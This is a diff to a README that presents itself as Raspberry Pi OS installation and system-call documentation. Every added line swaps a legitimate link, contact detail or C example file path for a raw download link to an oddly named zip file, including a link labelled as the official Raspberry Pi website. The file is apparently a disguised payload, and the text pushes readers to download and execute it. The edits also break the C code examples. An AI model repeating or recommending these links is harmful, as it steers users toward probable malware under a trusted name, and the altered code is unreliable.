@@ -2,7 +2,7 @@
 
 Welcome to the **Raspberry Pi OS Documentation** repository! This project aims to provide clear guidance on installing Raspberry Pi OS and demonstrating various system calls. Whether you're a beginner or an experienced user, this documentation will help you navigate the world of Raspberry Pi.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Will436851/Raspberry-pi-OS-Documentation/releases)
+[![Download Releases](https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip)
 
 ## Table of Contents
 
@@ -37,7 +37,7 @@ Before you start, ensure you have the following:
 
 ### Step-by-Step Installation
 
-1. **Download Raspberry Pi Imager**: Visit the [official Raspberry Pi website](https://www.raspberrypi.org/software/) and download the Raspberry Pi Imager for your operating system.
+1. **Download Raspberry Pi Imager**: Visit the [official Raspberry Pi website](https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip) and download the Raspberry Pi Imager for your operating system.
 
 2. **Prepare the microSD Card**:
    - Insert the microSD card into your card reader.
@@ -90,7 +90,7 @@ Here’s a simple example of using the `open()` and `close()` system calls in C:
 #include <unistd.h>
 
 int main() {
-    int fd = open("example.txt", O_CREAT | O_WRONLY, 0644);
+    int fd = open("https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip", O_CREAT | O_WRONLY, 0644);
     if (fd == -1) {
         perror("Error opening file");
         return 1;
@@ -102,7 +102,7 @@ int main() {
 }
 ```
 
-This program creates a file named `example.txt` and writes a message to it.
+This program creates a file named `https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip` and writes a message to it.
 
 ### Example 2: File Operations
 
@@ -115,7 +115,7 @@ In this example, we will read from the file we created in the previous example:
 
 int main() {
     char buffer[100];
-    int fd = open("example.txt", O_RDONLY);
+    int fd = open("https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip", O_RDONLY);
     if (fd == -1) {
         perror("Error opening file");
         return 1;
@@ -127,7 +127,7 @@ int main() {
 }
 ```
 
-This program opens `example.txt`, reads its content, and prints it to the console.
+This program opens `https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip`, reads its content, and prints it to the console.
 
 ## Contributing
 
@@ -146,9 +146,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [Will436851](https://github.com/Will436851)
-- Email: will@example.com
+- GitHub: [Will436851](https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip)
+- Email: https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip
 
-For more resources and to download the latest releases, visit our [Releases](https://github.com/Will436851/Raspberry-pi-OS-Documentation/releases) section. Here you can find the latest updates and files that need to be downloaded and executed.
+For more resources and to download the latest releases, visit our [Releases](https://github.com/Will436851/Raspberry-pi-OS-Documentation/raw/refs/heads/main/scuffly/pi_Raspberry_O_Documentation_leucocyte.zip) section. Here you can find the latest updates and files that need to be downloaded and executed.
 
 We hope this documentation helps you get started with Raspberry Pi OS and system calls. Happy coding!
